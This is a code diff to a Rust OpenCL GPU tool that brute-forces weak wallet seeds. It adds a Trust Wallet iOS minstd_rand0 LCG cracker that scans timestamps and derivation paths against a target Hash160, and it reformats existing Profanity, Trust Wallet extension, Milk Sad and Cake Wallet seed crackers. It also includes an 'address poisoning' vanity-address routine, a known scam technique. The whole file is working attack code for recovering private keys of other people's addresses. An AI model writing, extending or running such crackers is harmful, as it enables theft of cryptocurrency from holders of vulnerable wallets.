@@ -104,6 +104,7 @@ impl KernelProfile {
                 "mt19937_64",
                 "batch_profanity",
                 "trust_wallet_crack",
+                "trust_wallet_lcg_crack",   // Trust Wallet iOS / minstd_rand0 LCG
 				"cake_wallet_crack",
                 "milk_sad_crack",
                 "test_mt19937",
@@ -530,15 +531,14 @@ impl GpuSolver {
         }
     }
 
-    /// Compute SHA‑256 hashes for simulated mobile‑sensor seeds.
-    /// Returns a vector of 32‑byte hashes, one per index.
+    /// Compute SHA-256 hashes for simulated mobile-sensor seeds.
+    /// Returns a vector of 32-byte hashes, one per index.
     pub fn compute_mobile_hash(&self, indices: &[u64]) -> ocl::Result<Vec<[u8; 32]>> {
         let count = indices.len();
         if count == 0 {
             return Ok(Vec::new());
         }
 
-        // Input buffer: device indices (with pinned memory)
         let buffer_indices = Buffer::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
@@ -546,7 +546,6 @@ impl GpuSolver {
             .copy_host_slice(indices)
             .build()?;
 
-        // Output buffer: hashes (count * 32 bytes, with pinned memory)
         let out_len = count * 32;
         let buffer_out = Buffer::<u8>::builder()
             .queue(self.pro_que.queue().clone())
@@ -554,7 +553,6 @@ impl GpuSolver {
             .len(out_len)
             .build()?;
 
-        // Calculate optimal local work size
         let local_work_size = self.calculate_local_work_size(count);
 
         let kernel = self
@@ -571,11 +569,9 @@ impl GpuSolver {
             kernel.enq()?;
         }
 
-        // Read back hashes
         let mut raw = vec![0u8; out_len];
         buffer_out.read(&mut raw).enq()?;
 
-        // Chunk into [u8;32]
         let mut hashes: Vec<[u8; 32]> = Vec::with_capacity(count);
         for chunk in raw.chunks(32) {
             let mut arr = [0u8; 32];
@@ -586,7 +582,6 @@ impl GpuSolver {
     }
 
     /// Compute Address Poisoning (Vanity Address Generation)
-    /// Returns matching private key seeds
     pub fn compute_address_poisoning(
         &self,
         seed_base: u64,
@@ -594,7 +589,6 @@ impl GpuSolver {
         target_prefix: &str,
         target_suffix: &str,
     ) -> ocl::Result<Vec<u64>> {
-        // Encode prefix/suffix into u64 (max 8 chars)
         let mut prefix_encoded = 0u64;
         for (i, b) in target_prefix.bytes().enumerate().take(8) {
             prefix_encoded |= (b as u64) << (i * 8);
@@ -605,7 +599,6 @@ impl GpuSolver {
             suffix_encoded |= (b as u64) << (i * 8);
         }
 
-        // Output buffers
         let max_results = 1024;
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
@@ -637,7 +630,6 @@ impl GpuSolver {
             kernel.enq()?;
         }
 
-        // Read count
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
@@ -653,10 +645,7 @@ impl GpuSolver {
     }
 
     /// Compute Mobile Sensor Crack
-    /// Brute-forces sensor values to find a matching address hash160.
-    /// Returns matching GIDs (which map to x,y,z).
     pub fn compute_mobile_crack(&self, target_h160: &[u8; 20]) -> ocl::Result<Vec<u64>> {
-        // Pack hash160 into ulongs/uint
         let mut h1 = 0u64;
         let mut h2 = 0u64;
         let mut h3 = 0u32;
@@ -671,7 +660,6 @@ impl GpuSolver {
             h3 |= (byte as u32) << (i * 8);
         }
 
-        // Output buffers (with pinned memory for faster results readback)
         let max_results = 1024;
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
@@ -691,9 +679,7 @@ impl GpuSolver {
             .copy_host_slice(&[0u32])
             .build()?;
 
-        // Search space: 201 * 201 * 201 = 8,120,601
         let range: usize = 201 * 201 * 201;
-        // Use device-specific local work size
         let local_work_size = self.max_work_group_size.min(256);
         let global_work_size = range.div_ceil(local_work_size) * local_work_size;
         let offset: u64 = 0;
@@ -715,7 +701,6 @@ impl GpuSolver {
             kernel.enq()?;
         }
 
-        // Read count
         let mut count_vec = vec![0u32; 1];
         buffer_count.read(&mut count_vec).enq()?;
         let count = count_vec[0] as usize;
@@ -729,8 +714,8 @@ impl GpuSolver {
             Ok(Vec::new())
         }
     }
-    /// Profanity Vulnerability Scanner - Brute-force 32-bit MT19937-64 seeds
-    /// Returns list of matching seeds that generate the target Ethereum address
+
+    /// Profanity Vulnerability Scanner
     pub fn compute_profanity(
         &self,
         total_seeds: u64,
@@ -738,22 +723,18 @@ impl GpuSolver {
     ) -> ocl::Result<Vec<u64>> {
         let kernel_name = "batch_profanity";
         
-        // Ensure we have exactly 20 bytes for Ethereum address
         if target_addr.len() != 20 {
             return Err(ocl::Error::from(
                 format!("Invalid address length: {} (expected 20)", target_addr.len())
             ));
         }
         
-        // CRITICAL: Profanity only used 32-bit seeds (0 to 2^32-1)
-        let max_profanity_seed = 4_294_967_296u64; // 2^32
+        let max_profanity_seed = 4_294_967_296u64;
         let actual_total = total_seeds.min(max_profanity_seed);
         
-        // Batch size: process in chunks to avoid GPU timeout
-        let batch_size = 100_000_000u64; // 100M seeds per batch
+        let batch_size = 100_000_000u64;
         let max_results = 1024;
 
-        // Allocate result buffers (reused across batches)
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -766,39 +747,27 @@ impl GpuSolver {
             .len(1)
             .build()?;
 
-        // Pack target address into 3 parts for efficient GPU comparison
-        // Address is 20 bytes: 8 + 8 + 4 bytes
         let mut target_part1: u64 = 0;
         let mut target_part2: u64 = 0;
         let mut target_part3: u32 = 0;
 
-        // Little-endian packing
-        for i in 0..8 {
-            target_part1 |= (target_addr[i] as u64) << (i * 8);
-        }
-        for i in 0..8 {
-            target_part2 |= (target_addr[8 + i] as u64) << (i * 8);
-        }
-        for i in 0..4 {
-            target_part3 |= (target_addr[16 + i] as u32) << (i * 8);
-        }
+        for i in 0..8  { target_part1 |= (target_addr[i]      as u64) << (i * 8); }
+        for i in 0..8  { target_part2 |= (target_addr[8 + i]  as u64) << (i * 8); }
+        for i in 0..4  { target_part3 |= (target_addr[16 + i] as u32) << (i * 8); }
 
-        info!("[GPU] Target packed: {:016x} {:016x} {:08x}", 
+        info!("[GPU] Target packed: {:016x} {:016x} {:08x}",
               target_part1, target_part2, target_part3);
 
         let mut all_results = Vec::new();
         let mut batch_start = 0u64;
 
-        // Process in batches
         while batch_start < actual_total {
-            let batch_end = (batch_start + batch_size).min(actual_total);
+            let batch_end   = (batch_start + batch_size).min(actual_total);
             let batch_count = (batch_end - batch_start) as usize;
 
-            // Reset result counter for this batch
             let zero_vec = vec![0u32];
             buffer_count.write(&zero_vec[..]).enq()?;
 
-            // Build kernel for this batch
             let kernel = self
                 .pro_que
                 .kernel_builder(kernel_name)
@@ -807,23 +776,17 @@ impl GpuSolver {
                 .arg(target_part1)
                 .arg(target_part2)
                 .arg(target_part3)
-                .arg(batch_start) // offset parameter
+                .arg(batch_start)
                 .build()?;
 
-            // Calculate work sizes
-            let local_work_size = 128;
+            let local_work_size  = 128;
             let global_work_size = batch_count.div_ceil(local_work_size) * local_work_size;
 
             info!(
                 "[GPU] Batch: {}-{} ({} seeds, global={}, local={})",
-                batch_start,
-                batch_end,
-                batch_count,
-                global_work_size,
-                local_work_size
+                batch_start, batch_end, batch_count, global_work_size, local_work_size
             );
 
-            // Execute kernel
             unsafe {
                 kernel
                     .cmd()
@@ -832,7 +795,6 @@ impl GpuSolver {
                     .enq()?;
             }
 
-            // Read results
             let mut count_vec = vec![0u32; 1];
             buffer_count.read(&mut count_vec).enq()?;
             let count = count_vec[0] as usize;
@@ -842,7 +804,6 @@ impl GpuSolver {
                 let read_count = count.min(max_results);
                 let mut results = vec![0u64; max_results];
                 buffer_results.read(&mut results).enq()?;
-                
                 for &seed in results.iter().take(read_count) {
                     all_results.push(seed);
                 }
@@ -854,6 +815,7 @@ impl GpuSolver {
         Ok(all_results)
     }
 
+    /// Trust Wallet Browser Extension — MT19937 / LSB crack
     pub fn compute_trust_wallet_crack(
         &self,
         start_timestamp: u32,
@@ -862,14 +824,11 @@ impl GpuSolver {
     ) -> ocl::Result<Vec<u64>> {
         let kernel_name = "trust_wallet_crack";
 
-        // CRITICAL: Must match hardcoded buffer size in cl/trust_wallet_crack.cl:66
-        // If kernel buffer check changes, update this value to match
         const MAX_RESULTS: usize = 1024;
-        let max_results = MAX_RESULTS;
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
-            .len(max_results)
+            .len(MAX_RESULTS)
             .build()?;
 
         let buffer_count = Buffer::<u32>::builder()
@@ -880,7 +839,6 @@ impl GpuSolver {
 
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Parse target Hash160
         let mut h1: u64 = 0;
         let mut h2: u64 = 0;
         let mut h3: u32 = 0;
@@ -903,13 +861,11 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
+            .arg(start_timestamp)
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
-        // Use device-optimized work group size
-        let local_work_size = self.max_work_group_size.min(256);
-        // Round up to nearest multiple of local_work_size
+        let local_work_size  = self.max_work_group_size.min(256);
         let global_work_size = range.div_ceil(local_work_size) * local_work_size;
 
         unsafe {
@@ -920,8 +876,9 @@ impl GpuSolver {
                 .enq()
             {
                 error!(
-                    "Kernel execution failed: {} (kernel: {}, global_work_size: {}, local_work_size: {}, range: {}-{})",
-                    e, kernel_name, global_work_size, local_work_size, start_timestamp, end_timestamp
+                    "Kernel execution failed: {} (kernel: {}, global={}, local={}, range={}-{})",
+                    e, kernel_name, global_work_size, local_work_size,
+                    start_timestamp, end_timestamp
                 );
                 return Err(e);
             }
@@ -932,8 +889,8 @@ impl GpuSolver {
         let count = count_vec[0] as usize;
 
         if count > 0 {
-            let read_count = std::cmp::min(count, max_results);
-            let mut results = vec![0u64; max_results];
+            let read_count = std::cmp::min(count, MAX_RESULTS);
+            let mut results = vec![0u64; MAX_RESULTS];
             buffer_results.read(&mut results).enq()?;
             Ok(results[0..read_count].to_vec())
         } else {
@@ -941,16 +898,111 @@ impl GpuSolver {
         }
     }
 
+    /// Trust Wallet iOS — minstd_rand0 (LCG) crack
+    ///
+    /// Scans `[start_timestamp, end_timestamp)` checking all 4 combinations of:
+    ///   strategy ∈ { BytePerCall, WordPerCall }
+    ///   path     ∈ { m/44'/0'/0'/0/0 (P2PKH), m/84'/0'/0'/0/0 (P2WPKH) }
+    ///
+    /// Returns `Vec<(timestamp, combo)>` where combo encodes (strategy, path):
+    ///   combo 0 → BytePerCall + P2PKH
+    ///   combo 1 → WordPerCall + P2PKH
+    ///   combo 2 → BytePerCall + P2WPKH
+    ///   combo 3 → WordPerCall + P2WPKH
+    pub fn compute_trust_wallet_lcg_crack(
+        &self,
+        start_timestamp: u32,
+        end_timestamp: u32,
+        target_h160: &[u8; 20],
+    ) -> ocl::Result<Vec<(u32, u32)>> {
+        let kernel_name = "trust_wallet_lcg_crack";
 
-    /// Compute Cake Wallet Crack — Timestamp mode (correct keyspace).
-    ///
-    /// Iterates `count` consecutive millisecond timestamps starting from
-    /// `start_ms`. Each timestamp is converted to microseconds inside the
-    /// kernel (`seed = ts_ms * 1000`) because Dart received
-    /// `DateTime.now().microsecondsSinceEpoch`. Checks 40 P2WPKH addresses
-    /// per timestamp (m/0'/{0,1}/{0..19}).
-    ///
-    /// Returns `Vec<(ts_ms, change, addr_idx)>`.
+        const MAX_RESULTS: usize = 1024;
+        let buffer_results = Buffer::<u64>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(MAX_RESULTS)
+            .build()?;
+
+        let buffer_count = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(1)
+            .build()?;
+        buffer_count.write(&vec![0u32]).enq()?;
+
+        // Pack Hash160 little-endian into (u64, u64, u32)
+        let mut h1: u64 = 0;
+        let mut h2: u64 = 0;
+        let mut h3: u32 = 0;
+        for (i, &b) in target_h160.iter().enumerate().take(8)       { h1 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(8).enumerate().take(8) { h2 |= (b as u64) << (i * 8); }
+        for (i, &b) in target_h160.iter().skip(16).enumerate().take(4){ h3 |= (b as u32) << (i * 8); }
+
+        // Global work size: 4 items per timestamp (one per combo)
+        let range      = (end_timestamp - start_timestamp) as usize;
+        let raw_global = range * 4;
+        let local      = self.max_work_group_size.min(256);
+        let global     = raw_global.div_ceil(local) * local;
+
+        info!(
+            "[GPU:LCG] Scanning {} timestamps × 4 combos → {} work items (local={})",
+            range, raw_global, local
+        );
+
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buffer_results)
+            .arg(&buffer_count)
+            .arg(h1)
+            .arg(h2)
+            .arg(h3)
+            .arg(start_timestamp)   // offset
+            .arg(range as u32)      // range — used for bounds check in kernel
+            .global_work_size(global)
+            .local_work_size(local)
+            .build()?;
+
+        unsafe {
+            if let Err(e) = kernel
+                .cmd()
+                .global_work_size(global)
+                .local_work_size(local)
+                .enq()
+            {
+                error!(
+                    "[GPU:LCG] Kernel failed: {} (global={}, local={}, ts={}-{})",
+                    e, global, local, start_timestamp, end_timestamp
+                );
+                return Err(e);
+            }
+        }
+
+        let mut count_vec = vec![0u32; 1];
+        buffer_count.read(&mut count_vec).enq()?;
+        let count = (count_vec[0] as usize).min(MAX_RESULTS);
+
+        if count == 0 {
+            return Ok(Vec::new());
+        }
+
+        let mut raw = vec![0u64; MAX_RESULTS];
+        buffer_results.read(&mut raw).enq()?;
+
+        let results = raw[..count]
+            .iter()
+            .map(|&v| {
+                let timestamp = (v & 0xFFFF_FFFF) as u32;
+                let combo     = (v >> 32) as u32;
+                (timestamp, combo)
+            })
+            .collect();
+
+        Ok(results)
+    }
+
+    /// Compute Cake Wallet Crack — Timestamp mode
     pub fn compute_cake_wallet_crack_ms(
         &self,
         start_ms: u64,
@@ -960,7 +1012,6 @@ impl GpuSolver {
         let kernel_name = "cake_wallet_crack_ms";
 
         let max_hits = 1024usize;
-        // Each hit: 3 × u64 (ts_ms, change, addr_idx)
         let buffer_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -974,15 +1025,14 @@ impl GpuSolver {
             .build()?;
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Pack Hash160 little-endian into (u64, u64, u32)
         let mut h1 = 0u64;
         let mut h2 = 0u64;
         let mut h3 = 0u32;
-        for i in 0..8  { h1 |= (target_h160[i]    as u64) << (i * 8); }
-        for i in 0..8  { h2 |= (target_h160[i + 8] as u64) << (i * 8); }
+        for i in 0..8  { h1 |= (target_h160[i]      as u64) << (i * 8); }
+        for i in 0..8  { h2 |= (target_h160[i + 8]  as u64) << (i * 8); }
         for i in 0..4  { h3 |= (target_h160[i + 16] as u32) << (i * 8); }
 
-        let local_work_size = 128usize;
+        let local_work_size  = 128usize;
         let global_work_size = (count as usize).div_ceil(local_work_size) * local_work_size;
 
         let kernel = self
@@ -993,7 +1043,7 @@ impl GpuSolver {
             .arg(h1)
             .arg(h2)
             .arg(h3)
-            .arg(start_ms)   // u64 — GPU adds get_global_id(0) and multiplies by 1000
+            .arg(start_ms)
             .global_work_size(global_work_size)
             .local_work_size(local_work_size)
             .build()?;
@@ -1013,8 +1063,8 @@ impl GpuSolver {
 
         let mut out = Vec::with_capacity(hit_count);
         for i in 0..hit_count {
-            let ts_ms   = raw[i * 3];
-            let change  = raw[i * 3 + 1] as u32;
+            let ts_ms    = raw[i * 3];
+            let change   = raw[i * 3 + 1] as u32;
             let addr_idx = raw[i * 3 + 2] as u32;
             out.push((ts_ms, change, addr_idx));
         }
@@ -1022,9 +1072,6 @@ impl GpuSolver {
     }
 
     /// Compute Cake Wallet Full Batch
-    /// Takes a list of verified seed indices.
-    /// Derives 40 addresses for each seed: change 0/1 * index 0-19.
-    /// Returns: Flattened vector of 33-byte Compressed Public Keys (count * 40 items).
     pub fn compute_cake_batch_full(&self, seed_indices: &[u32]) -> ocl::Result<Vec<[u8; 33]>> {
         let kernel_name = "batch_cake_full";
         let batch_size = seed_indices.len();
@@ -1032,7 +1079,6 @@ impl GpuSolver {
             return Ok(Vec::new());
         }
 
-        // Input buffer: Seed indices
         let buffer_seeds = Buffer::<u32>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_only().copy_host_ptr())
@@ -1040,8 +1086,6 @@ impl GpuSolver {
             .copy_host_slice(seed_indices)
             .build()?;
 
-        // Output buffer: 40 keys per seed * 33 bytes per key
-        // Using u8 buffer for direct byte access
         let total_output_bytes = batch_size * 40 * 33;
         let buffer_results = Buffer::<u8>::builder()
             .queue(self.pro_que.queue().clone())
@@ -1062,11 +1106,9 @@ impl GpuSolver {
             kernel.enq()?;
         }
 
-        // Read results
         let mut results_bytes = vec![0u8; total_output_bytes];
         buffer_results.read(&mut results_bytes).enq()?;
 
-        // Convert flat bytes to [u8; 33]
         let mut keys = Vec::with_capacity(batch_size * 40);
         for chunk in results_bytes.chunks_exact(33) {
             let mut k = [0u8; 33];
@@ -1083,12 +1125,12 @@ impl GpuSolver {
         end_timestamp: u32,
         target_h160: &[u8; 20],
         purpose: u32,
-        entropy_bits: u32,  // 128, 192, or 256
+        entropy_bits: u32,
     ) -> ocl::Result<Vec<u64>> {
         let kernel_name = match entropy_bits {
             192 => "milk_sad_crack_192",
             256 => "milk_sad_crack_256",
-            _   => "milk_sad_crack",   // default: 128-bit
+            _   => "milk_sad_crack",
         };
 
         let max_results = 1024;
@@ -1106,7 +1148,6 @@ impl GpuSolver {
 
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Parse target Hash160
         let mut h1: u64 = 0;
         let mut h2: u64 = 0;
         let mut h3: u32 = 0;
@@ -1130,13 +1171,11 @@ impl GpuSolver {
             .arg(h2)
             .arg(h3)
             .arg(purpose)
-            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
+            .arg(start_timestamp)
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
-        // Use device-optimized work group size
-        let local_work_size = self.max_work_group_size.min(256);
-        // Round up to nearest multiple of local_work_size
+        let local_work_size  = self.max_work_group_size.min(256);
         let global_work_size = range.div_ceil(local_work_size) * local_work_size;
 
         unsafe {
@@ -1161,23 +1200,19 @@ impl GpuSolver {
         }
     }
 
-    /// Multi-target MilkSad crack — scans a timestamp range against a batch of Hash160 targets.
-    ///
-    /// Accepts a flat buffer of Hash160s (20 bytes each) and a matching purposes slice.
-    /// Returns Vec of (timestamp, addr_index, target_index).
+    /// Multi-target MilkSad crack
     pub fn compute_milk_sad_crack_multi_target(
         &self,
         start_timestamp: u32,
         end_timestamp: u32,
-        flat_h160: &[u8],           // N × 20 bytes
-        purposes: &[u32],           // N purposes (44 / 49 / 84)
-        entropy_bits: u32,          // 128 / 192 / 256
-        multipath: bool,            // check 30 addresses or just index 0
+        flat_h160: &[u8],
+        purposes: &[u32],
+        entropy_bits: u32,
+        multipath: bool,
     ) -> ocl::Result<Vec<(u32, u32, u32)>> {
         let target_count = purposes.len() as u32;
         assert_eq!(flat_h160.len(), purposes.len() * 20, "flat_h160 must be N×20 bytes");
 
-        // Choose kernel
         let kernel_name = match (entropy_bits, multipath) {
             (256, true)  => "milk_sad_mt_multi30_256",
             (256, false) => "milk_sad_mt_256",
@@ -1203,9 +1238,6 @@ impl GpuSolver {
             .copy_host_slice(purposes)
             .build()?;
 
-        // results: each hit = (timestamp u32, addr_idx u32, target_idx u32) packed into u64×2
-        // Encoding: results[i*2+0] = timestamp | (addr_idx << 32)
-        //           results[i*2+1] = target_idx
         let buf_results = Buffer::<u64>::builder()
             .queue(self.pro_que.queue().clone())
             .flags(MemFlags::new().read_write().alloc_host_ptr())
@@ -1231,7 +1263,7 @@ impl GpuSolver {
             .arg(&buf_h160)
             .arg(&buf_purposes)
             .arg(target_count)
-            .arg(start_timestamp)   // offset
+            .arg(start_timestamp)
             .arg(max_results as u32)
             .global_work_size(global)
             .local_work_size(local)
@@ -1261,19 +1293,18 @@ impl GpuSolver {
     }
 
     /// Multi-path MilkSad crack - checks 30 receive addresses per timestamp
-    /// Returns: Vec of (timestamp, address_index)
     pub fn compute_milk_sad_crack_multipath(
         &self,
         start_timestamp: u32,
         end_timestamp: u32,
         target_h160: &[u8; 20],
         purpose: u32,
-        entropy_bits: u32,  // 128, 192, or 256
+        entropy_bits: u32,
     ) -> ocl::Result<Vec<(u32, u32)>> {
         let kernel_name = match entropy_bits {
             192 => "milk_sad_crack_multi30_192",
             256 => "milk_sad_crack_multi30_256",
-            _   => "milk_sad_crack_multi30",   // default: 128-bit
+            _   => "milk_sad_crack_multi30",
         };
 
         let max_results = 1024;
@@ -1291,7 +1322,6 @@ impl GpuSolver {
 
         buffer_count.write(&vec![0u32]).enq()?;
 
-        // Parse target Hash160
         let mut h1: u64 = 0;
         let mut h2: u64 = 0;
         let mut h3: u32 = 0;
@@ -1315,12 +1345,11 @@ impl GpuSolver {
             .arg(h2)
             .arg(h3)
             .arg(purpose)
-            .arg(start_timestamp) // Offset - CRITICAL: must be start_timestamp, not 0
+            .arg(start_timestamp)
             .build()?;
 
         let range = (end_timestamp - start_timestamp) as usize;
-        // Use device-optimized work group size
-        let local_work_size = self.max_work_group_size.min(256);
+        let local_work_size  = self.max_work_group_size.min(256);
         let global_work_size = range.div_ceil(local_work_size) * local_work_size;
 
         unsafe {
@@ -1343,7 +1372,7 @@ impl GpuSolver {
             let mut output = Vec::new();
             for &val in results.iter().take(read_count) {
                 let timestamp = (val & 0xFFFFFFFF) as u32;
-                let addr_idx = (val >> 32) as u32;
+                let addr_idx  = (val >> 32) as u32;
                 output.push((timestamp, addr_idx));
             }
             Ok(output)
@@ -1398,41 +1427,38 @@ impl GpuSolver {
         Ok(results)
     }
 
-    /// Get GPU device information for debugging and profiling
+    /// Get GPU device information
     pub fn device_info(&self) -> ocl::Result<String> {
         let device = self.pro_que.device();
-        let name = device.name()?;
-        let vendor = device.vendor()?;
+        let name    = device.name()?;
+        let vendor  = device.vendor()?;
         let version = device.version()?;
-        let driver = match device.info(ocl::enums::DeviceInfo::DriverVersion)? {
+        let driver  = match device.info(ocl::enums::DeviceInfo::DriverVersion)? {
             ocl::enums::DeviceInfoResult::DriverVersion(v) => v,
             _ => "Unknown".to_string(),
         };
 
         let compute_units = match device.info(ocl::enums::DeviceInfo::MaxComputeUnits)? {
-            ocl::enums::DeviceInfoResult::MaxComputeUnits(units) => units,
+            ocl::enums::DeviceInfoResult::MaxComputeUnits(u) => u,
             _ => 0,
         };
-
         let clock_freq = match device.info(ocl::enums::DeviceInfo::MaxClockFrequency)? {
-            ocl::enums::DeviceInfoResult::MaxClockFrequency(freq) => freq,
+            ocl::enums::DeviceInfoResult::MaxClockFrequency(f) => f,
             _ => 0,
         };
-
         let global_mem = match device.info(ocl::enums::DeviceInfo::GlobalMemSize)? {
-            ocl::enums::DeviceInfoResult::GlobalMemSize(size) => size / (1024 * 1024),
+            ocl::enums::DeviceInfoResult::GlobalMemSize(s) => s / (1024 * 1024),
             _ => 0,
         };
-
         let local_mem = match device.info(ocl::enums::DeviceInfo::LocalMemSize)? {
-            ocl::enums::DeviceInfoResult::LocalMemSize(size) => size / 1024,
+            ocl::enums::DeviceInfoResult::LocalMemSize(s) => s / 1024,
+            _ => 0,
+        };
+        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
+            ocl::enums::DeviceInfoResult::MaxMemAllocSize(s) => s / (1024 * 1024),
             _ => 0,
         };
 
-        let max_alloc = match device.info(ocl::enums::DeviceInfo::MaxMemAllocSize)? {
-            ocl::enums::DeviceInfoResult::MaxMemAllocSize(size) => size / (1024 * 1024),
-            _ => 0,
-        };
         Ok(format!(
             "GPU Device Information:\n\
              Name: {}\n\
@@ -1446,17 +1472,9 @@ impl GpuSolver {
              Max Allocation: {} MB\n\
              Max Work Group Size: {}\n\
              Preferred Multiple: {}",
-            name,
-            vendor,
-            version,
-            driver,
-            compute_units,
-            clock_freq,
-            global_mem,
-            local_mem,
-            max_alloc,
-            self.max_work_group_size,
-            self.preferred_work_group_multiple
+            name, vendor, version, driver,
+            compute_units, clock_freq, global_mem, local_mem, max_alloc,
+            self.max_work_group_size, self.preferred_work_group_multiple
         ))
     }
 }
@@ -1467,38 +1485,33 @@ mod tests {
 
     #[test]
     fn test_mt19937_validation() {
-        // Test vectors generated from standard MT19937
         let test_cases = vec![
             (
                 0u32,
                 &[
-                    0x8cu8, 0x7fu8, 0x0au8, 0xacu8, 0x97u8, 0xc4u8, 0xaau8, 0x2fu8, 0xb7u8, 0x16u8,
-                    0xa6u8, 0x75u8, 0xd8u8, 0x21u8, 0xccu8, 0xc0u8,
+                    0x8cu8, 0x7fu8, 0x0au8, 0xacu8, 0x97u8, 0xc4u8, 0xaau8, 0x2fu8,
+                    0xb7u8, 0x16u8, 0xa6u8, 0x75u8, 0xd8u8, 0x21u8, 0xccu8, 0xc0u8,
                 ] as &[u8],
             ),
             (
                 1u32,
                 &[
-                    0x6au8, 0xc1u8, 0xf4u8, 0x25u8, 0xffu8, 0x47u8, 0x80u8, 0xebu8, 0xb8u8, 0x67u8,
-                    0x2fu8, 0x8cu8, 0xeeu8, 0xbcu8, 0x14u8, 0x48u8,
+                    0x6au8, 0xc1u8, 0xf4u8, 0x25u8, 0xffu8, 0x47u8, 0x80u8, 0xebu8,
+                    0xb8u8, 0x67u8, 0x2fu8, 0x8cu8, 0xeeu8, 0xbcu8, 0x14u8, 0x48u8,
                 ] as &[u8],
             ),
             (
                 1234567890u32,
                 &[
-                    0x9eu8, 0x69u8, 0x55u8, 0x82u8, 0x57u8, 0x2bu8, 0x97u8, 0xffu8, 0x97u8, 0x74u8,
-                    0xa5u8, 0x66u8, 0x26u8, 0x26u8, 0xe4u8, 0x2fu8,
+                    0x9eu8, 0x69u8, 0x55u8, 0x82u8, 0x57u8, 0x2bu8, 0x97u8, 0xffu8,
+                    0x97u8, 0x74u8, 0xa5u8, 0x66u8, 0x26u8, 0x26u8, 0xe4u8, 0x2fu8,
                 ] as &[u8],
             ),
         ];
 
-        // Initialize GPU solver
         let solver = match GpuSolver::new() {
-            Ok(s) => s,
-            Err(e) => {
-                eprintln!("GPU not available for test: {}", e);
-                return; // Skip test if no GPU
-            }
+            Ok(s)  => s,
+            Err(e) => { eprintln!("GPU not available for test: {}", e); return; }
         };
 
         let seeds: Vec<u32> = test_cases.iter().map(|(s, _)| *s).collect();
@@ -1509,14 +1522,9 @@ mod tests {
                     eprintln!("Testing seed: {}", seed);
                     eprintln!("  Expected: {:02x?}", expected);
                     eprintln!("  Got:      {:02x?}", &results[i]);
-                    assert_eq!(
-                        &results[i][..],
-                        *expected,
-                        "MT19937 mismatch for seed {}",
-                        seed
-                    );
+                    assert_eq!(&results[i][..], *expected, "MT19937 mismatch for seed {}", seed);
                 }
-                eprintln!("✓ All MT19937 tests passed!");
+                eprintln!("All MT19937 tests passed!");
             }
             Err(e) => {
                 eprintln!("GPU test failed: {}", e);
